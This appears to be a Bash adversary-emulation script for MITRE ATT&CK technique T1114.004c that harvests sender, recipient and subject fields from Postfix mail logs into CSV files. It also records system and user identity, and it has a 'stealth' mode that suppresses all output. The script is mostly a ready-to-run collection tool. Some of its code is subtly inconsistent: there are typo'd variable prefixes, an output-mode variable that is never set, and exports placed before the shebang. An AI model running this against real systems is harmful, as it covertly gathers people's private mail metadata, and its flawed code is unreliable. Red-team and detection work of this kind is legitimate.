
    # ===== VARIABLES ESSENTIELLES COLLECTION =====
    export T1114_004C_DEBUG_MODE="${T1114_004C_DEBUG_MODE:-false}"
    export T1114_004C_TIMEOUT="${T1114_004C_TIMEOUT:-300}"
    export T1114_004C_FALLBACK_MODE="${T1114_004C_FALLBACK_MODE:-real}"
    export T1114_004C_OUTPUT_FORMAT="${T1114_004C_OUTPUT_FORMAT:-json}"
    export T1114_004C_POLICY_CHECK="${T1114_004C_POLICY_CHECK:-true}"
    export T1114_004C_MAX_FILES="${T1114_004C_MAX_FILES:-200}"
    export T1114_004C_MAX_FILE_SIZE="${T1114_004C_MAX_FILE_SIZE:-1048576}"
    export T1114_004C_SCAN_DEPTH="${T1114_004C_SCAN_DEPTH:-3}"
    export T1114_004C_EXCLUDE_CACHE="${T1114_004C_EXCLUDE_CACHE:-true}"
    export T1114_004C_CAPTURE_DURATION="${T1114_004C_CAPTURE_DURATION:-60}"
    # ===== FIN VARIABLES COLLECTION =====

#!/bin/bash

# T1114.004c - Email Collection: Postfix Logs Extract Linux
# MITRE ATT&CK Enterprise - Collection Tactic (TA0009)
# ATOMIC ACTION: Extract specific data from Postfix logs ONLY
# Platform: Linux | Architecture: 4 orchestrators + auxiliary functions

# Critical dependencies verification
Check-CriticalDeps() { 
    for cmd in bash jq bc grep find stat awk sed; do 
        command -v "$cmd" >/dev/null || { 
            [[ "${TT1114_004C_OUTPUT_MODE:-simple}" != "stealth" ]] && echo "[ERROR] Missing dependency: $cmd"; exit 1; 
        }
    done
}

# Environment variables loading
Load-EnvironmentVariables() {
    export T1114_004C_OUTPUT_BASE="${T1114_004C_OUTPUT_BASE:-./mitre_results}"
    export T1114_004C_TIMEOUT="${TT1114_004C_TIMEOUT:-300}"
    export T1114_004C_OUTPUT_MODE="${TT1114_004C_OUTPUT_MODE:-simple}"
    export T1114_004C_SILENT_MODE="${TT1114_004C_SILENT_MODE:-false}"
    export T1114_004C_MAX_EXTRACTS="${T1114_004C_MAX_EXTRACTS:-500}"
    
    export T1114_004C_LOG_PATHS="${T1114_004C_LOG_PATHS:-/var/log/mail.log,/var/log/postfix_log}"
    export T1114_004C_EXTRACT_PATTERNS="${T1114_004C_EXTRACT_PATTERNS:-from=<.*>,to=<.*>,subject=_*}"
    export T1114_004C_OUTPUT_FORMAT="${T1114_004C_OUTPUT_FORMAT:-csv}"
    export T1114_004C_INCLUDE_TIMESTAMPS="${T1114_004C_INCLUDE_TIMESTAMPS:-true}"
    export T1114_004C_FILTER_EXTERNAL="${T1114_004C_FILTER_EXTERNAL:-true}"
}

# System preconditions validation
Validate-SystemPreconditions() {
    [[ -z "$T1114_004C_OUTPUT_BASE" ]] && { [[ "${TT1114_004C_OUTPUT_MODE:-simple}" != "stealth" ]] && echo "[ERROR] T1114_004C_OUTPUT_BASE not set"; return 1; }
    [[ ! -w "$(dirname "$T1114_004C_OUTPUT_BASE")" ]] && { [[ "${TT1114_004C_OUTPUT_MODE:-simple}" != "stealth" ]] && echo "[ERROR] Output directory not writable"; return 1; }
    return 0
}

# Output structure initialization
Initialize-OutputStructure() {
    local timestamp=$(date +%Y%m%d_%H%M%S)
    export COLLECTION_DIR="$T1114_004C_OUTPUT_BASE/T1114_004c_postfix_extract_$timestamp"
    mkdir -p "$COLLECTION_DIR"/{extracted_data,metadata} 2>/dev/null || return 1
    chmod 700 "$COLLECTION_DIR" 2>/dev/null
    echo "$COLLECTION_DIR"
}

# Extract data from Postfix logs
Extract-PostfixData() {
    local log_file="$1" collection_dir="$2"
    
    [[ ! -f "$log_file" || ! -r "$log_file" ]] && return 1
    
    local extract_file="$collection_dir/extracted_data/extract_$(basename "$log_file")_$(date +%s).${T1114_004C_OUTPUT_FORMAT}"
    local extract_count=0
    
    {
        [[ "$T1114_004C_INCLUDE_TIMESTAMPS" == "true" ]] && echo "timestamp,from,to,subject"
        
        while IFS= read -r line; do
            local timestamp=$(echo "$line" | awk '{print $1" "$2" "$3}')
            local from_addr=$(echo "$line" | grep -o 'from=<[^>]*>' | sed 's/from=<\(.*\)>/\1/')
            local to_addr=$(echo "$line" | grep -o 'to=<[^>]*>' | sed 's/to=<\(.*\)>/\1/')
            local subject=$(echo "$line" | grep -o 'subject=.*' | sed 's/subject=//')
            
            if [[ -n "$from_addr" || -n "$to_addr" ]]; then
                if [[ "$T1114_004C_INCLUDE_TIMESTAMPS" == "true" ]]; then
                    echo "$timestamp,$from_addr,$to_addr,$subject"
                else
                    echo "$from_addr,$to_addr,$subject"
                fi
                ((extract_count++))
                [[ $extract_count -ge ${T1114_004C_MAX_EXTRACTS:-500} ]] && break
            fi
        done < "$log_file"
        
    } > "$extract_file"
    
    if [[ -f "$extract_file" && -s "$extract_file" ]]; then
        local file_size=$(stat -c%s "$extract_file" 2>/dev/null || echo 0)
        echo "$extract_file:$file_size"
        [[ "$T1114_004C_SILENT_MODE" != "true" ]] && echo "  + Extracted: $extract_count entries from $log_file ($file_size bytes)" >&2
        return 0
    fi
    return 1
}

# System metadata collection
Collect-SystemMetadata() {
    local collection_dir="$1"
    echo "$(uname -a)" > "$collection_dir/metadata/system_info.txt"
    echo "$(id)" > "$collection_dir/metadata/user_context.txt"
    echo "$(pwd)" > "$collection_dir/metadata/working_dir.txt"
}

# Execution message logging
Log-ExecutionMessage() {
    local message="$1"
    # Silent in stealth mode or when T1114_004C_SILENT_MODE is true
    [[ "$T1114_004C_SILENT_MODE" != "true" && "${TT1114_004C_OUTPUT_MODE:-simple}" != "stealth" ]] && echo "$message" >&2
}

# Simple output generation
Generate-SimpleOutput() {
    local files_collected="$1" total_size="$2" collection_dir="$3"
    echo "POSTFIX EXTRACT "
    echo "Files: $files_collected"
    echo "Size: $total_size bytes"
    echo "Complete"
}

# Debug output generation
Generate-DebugOutput() {
    local files_collected="$1" total_size="$2" collection_dir="$3"
    local json_output=$(cat << EOF
{
    "@timestamp": "$(date -u +%Y-%m-%dT%H:%M:%SZ)",
    "technique": "T1114.004c",
    "results": {
        "files_extracted": $files_collected,
        "total_size_bytes": $total_size,
        "collection_directory": "$collection_dir"
    }
}
EOF
)
    echo "$json_output" > "$collection_dir/metadata/results.json"
    [[ "$T1114_004C_SILENT_MODE" != "true" ]] && echo "$json_output"
}

# Stealth output generation
Generate-StealthOutput() {
    local files_collected="$1"
    echo "$files_collected" > /dev/null 2>&1
}

# None output generation
Generate-NoneOutput() {
    : # No output
}
# 4 MAIN ORCHESTRATORS (10-20 lines each)
# Function 1: Configuration (10-20 lines) - Orchestrator
Get-Configuration() {
    Check-CriticalDeps || exit 1
    Load-EnvironmentVariables
    Validate-SystemPreconditions || exit 1
    
    local collection_dir
    collection_dir=$(Initialize-OutputStructure) || exit 1
    
    echo "$collection_dir"
}

# Function 2: Atomic Action (10-20 lines) - Orchestrator
Invoke-MicroTechniqueAction() {
    local collection_dir="$1"
    local collected_files=() total_size=0 file_count=0
    
    Log-ExecutionMessage "[INFO] Extracting Postfix log data..."
    
    # ATOMIC ACTION: Orchestration of auxiliary functions
    IFS=',' read -ra log_paths <<< "$T1114_004C_LOG_PATHS"
    
    for log_path in "${log_paths[@]}"; do
        log_path=$(echo "$log_path" | xargs)
        
        if [[ -f "$log_path" ]]; then
            if result=$(Extract-PostfixData "$log_path" "$collection_dir"); then
                IFS=':' read -r file_path file_size <<< "$result"
                collected_files+=("$file_path")
                total_size=$((total_size + file_size))
                ((file_count++))
            fi
        fi
    done
    
    Collect-SystemMetadata "$collection_dir"
    echo "$file_count:$total_size:$(IFS=,; echo "${collected_files[*]}")"
}

# Function 3: Output (10-20 lines) - Orchestrator
Write-StandardizedOutput() {
    local collection_dir="$1" files_collected="$2" total_size="$3"
    
    case "${OUTPUT_MODE:-simple}" in
        "simple")  Generate-SimpleOutput "$files_collected" "$total_size" "$collection_dir" ;;
        "debug")   Generate-DebugOutput "$files_collected" "$total_size" "$collection_dir" ;;
        "stealth") Generate-StealthOutput "$files_collected" ;;
        "none")    Generate-NoneOutput ;;
    esac
}

# Function 4: Main (10-15 lines) - Chief Orchestrator
Main() {
    trap 'echo "[INTERRUPTED] Cleaning up..."; exit 130' INT TERM
    
    # Load environment variables in main context
    Load-EnvironmentVariables

    local collection_dir
    collection_dir=$(Get-Configuration) || exit 2
    
    local results
    results=$(Invoke-MicroTechniqueAction "$collection_dir") || exit 1
    
    IFS=':' read -r files_collected total_size _ <<< "$results"
    Write-StandardizedOutput "$collection_dir" "$files_collected" "$total_size"
    
    Log-ExecutionMessage "[SUCCESS] Completed: $files_collected files extracted"
    exit 0
}

# Execute
Main "$@"